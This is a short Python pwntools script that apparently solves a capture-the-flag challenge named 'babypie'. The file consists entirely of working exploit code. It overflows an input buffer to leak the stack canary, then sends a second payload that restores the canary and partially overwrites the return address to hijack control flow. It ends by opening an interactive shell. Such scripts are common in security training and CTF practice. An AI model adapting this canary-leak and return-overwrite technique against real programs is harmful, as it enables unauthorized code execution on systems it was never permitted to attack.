from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./babypie"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)
context.arch = "amd64"
payload = flat([
    "a"*(0x30-8),"b"
])
p.sendafter("Input your Name:\n",payload)
p.recvuntil("b")

canary = u64("\0" + p.recv(7))
log.success("canary is ->" + hex(canary))
payload = flat([
    # padding ,canary , old rbp ,ret
    "c"*(0x30-8),canary,"b"*8+"\x3e\x0a"
    ])
p.sendafter(":\n",payload)
p.interactive()
